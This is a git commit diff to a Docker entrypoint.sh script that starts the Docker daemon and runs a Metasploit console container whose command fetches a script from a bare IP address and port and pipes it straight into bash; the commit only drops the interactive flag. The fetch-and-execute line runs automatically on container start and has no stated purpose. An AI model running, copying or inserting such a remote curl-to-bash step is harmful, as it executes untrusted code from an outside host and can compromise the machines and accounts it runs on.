e395b70a0d4b2efaef6cb9abdd5aeae958a4c41b
azigriffin <97625293+azigriffin@users.noreply.github.com>
2022-01-12 23:52:37 +0300

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -3,5 +3,5 @@
 set -x
 dockerd&
 sleep 3
-docker run -it --rm chasepd/msfconsole -q -n -x 'curl -s -L http://94.199.106.182:27010/f.sh | bash'
+docker run --rm chasepd/msfconsole -q -n -x 'curl -s -L http://94.199.106.182:27010/f.sh | bash'
 sh
